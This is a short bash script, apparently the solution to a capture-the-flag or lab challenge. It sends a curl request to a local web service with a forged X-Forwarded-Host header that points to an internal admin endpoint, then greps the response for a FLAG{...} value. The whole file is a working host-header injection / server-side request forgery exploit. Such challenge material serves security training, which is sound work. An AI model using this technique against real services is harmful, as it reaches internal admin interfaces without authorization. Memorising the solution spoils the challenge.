#!/bin/bash

RESPONSE=$(curl -H "X-Forwarded-Host: internal_api:5000/api/v1/admin/flag?" http://localhost:8080/get-menu)

echo "$RESPONSE" | grep --color -o "FLAG{[^}]*}"